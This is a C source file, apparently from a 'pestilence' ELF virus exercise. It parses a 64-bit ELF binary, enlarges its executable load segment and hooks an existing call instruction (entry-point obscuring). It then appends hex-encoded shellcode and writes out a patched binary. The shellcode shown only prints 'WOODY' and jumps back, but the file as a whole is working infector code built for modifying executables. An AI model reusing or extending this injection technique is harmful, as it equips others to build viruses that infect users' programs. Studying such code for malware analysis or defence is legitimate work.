#include "pestilence.h"
char bytecode[] = 
"\x57\x56\x50\x51\x52\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x55\x48\x89\xe5\x48\x83\xe4\xf0\x48\x83\xec\x10\xc7\x04\x24\x2e\x2e\x2e\x2e\xc7\x44\x24\x04\x57\x4f\x4f\x44\xc7\x44\x24\x08\x59\x2e\x2e\x2e\xc7\x44\x24\x0c\x2e\x0a\x00\x00\xba\x0e\x00\x00\x00\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x8d\x34\x24\x0f\x05\x48\x83\xc4\x10\x48\x89\xec\x5d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59\x41\x58\x5a\x59\x58\x5e\x5f\xe9\xfb\xff\xff\xff";
void		init_info(t_info *info)
{
	info->text_begin = 0;
	info->text_size = 0;
}

void		find_text(t_info *info)
{
	Elf64_Ehdr	*main_header;
	Elf64_Phdr	*header;
	int32_t		i;
	size_t		base_entry;

	main_header = (Elf64_Ehdr *)(info->file);
	base_entry = main_header->e_entry;
	i = 0;
	header = (Elf64_Phdr *)(info->file + sizeof(Elf64_Ehdr));
	while (i < main_header->e_phnum)
	{
		if ((header->p_type == PT_LOAD) && (base_entry > header->p_vaddr) && (base_entry < header->p_vaddr + header->p_memsz))
		{
			info->text_begin = header->p_offset + info->file;
			info->text_size = header->p_filesz;
			header->p_filesz += sizeof(bytecode);
			header->p_memsz += sizeof(bytecode);
			return ;
		}
		header++;
		i++;
	}
}

int			valid_call(t_info *info, int pos)
{
	int32_t		dest;
	uint32_t	prolog;

	dest = *((int32_t *)(info->text_begin + pos));
	if ((dest + pos + 4 < 0) || ((size_t)(dest + pos + 4) > info->text_size))
		return (1);
	prolog = *((int32_t *)(info->text_begin + dest + pos + 4));
	if (prolog == 0xe5894855)
	{
		info->addr_to_jump = info->text_begin + dest + pos + 4;
		return (0);
	}
	return (1);
}

void		epo_parsing(t_info *info)
{
	size_t	i;
	uint8_t	c;

	i = 0;
	while (i < info->text_size)
	{
		c = *((uint8_t *)(info->text_begin + i));
		if (c == 0xe8 && i + 4 < info->text_size && (valid_call(info, i + 1) == 0))
		{
			info->call_to_replace = info->text_begin + i;
			return ;
		}
		i++;
	}
}

void	hook_call(t_info *info)
{
	int32_t	new_jmp;

	new_jmp = (int32_t)(info->text_size - (size_t)((size_t)(info->call_to_replace) - (size_t)(info->text_begin)) - 5);
	ft_memcpy(info->call_to_replace + 1, &new_jmp, sizeof(new_jmp));
}


void	patch_bytecode(t_info *info)
{
	int32_t	start;
	int32_t	end;
	int32_t	new_jmp;

	start = info->text_size + sizeof(bytecode) - 1;
	end = (int32_t)((size_t)(info->addr_to_jump) - (size_t)(info->text_begin));
	new_jmp = end - start;

	dprintf(1, "%#x\n", *(uint32_t *)(bytecode + sizeof(bytecode) - 5));
	ft_memcpy(bytecode + sizeof(bytecode) - 5, &new_jmp, sizeof(new_jmp));
	dprintf(1, "%#x\n", *(uint32_t *)(bytecode + sizeof(bytecode) - 5));
}

void	inject_loader(t_info *info)
{
	hook_call(info);
	patch_bytecode(info);
	ft_memcpy(info->text_begin + info->text_size, bytecode, sizeof(bytecode));
}

void	write_file(t_info info, char *name)
{
	int fd = open(name, O_WRONLY | O_CREAT | O_TRUNC);
	write(fd, info.file, info.file_size);
	close(fd);
}

int		main(int argc, char **argv)
{
	if (argc != 2)
		return (dprintf(1, "usage : 2 arg\n"));
	struct stat		st;
	int				fd = open(argv[1], O_RDWR);
	t_info			info;
	

	init_info(&info);
	fstat(fd, &st);
	info.file_size = st.st_size;
	info.file = mmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
	find_text(&info);
	epo_parsing(&info);
	inject_loader(&info);
	close(fd);
	write_file(info, "test/patched");
	return (0);
}
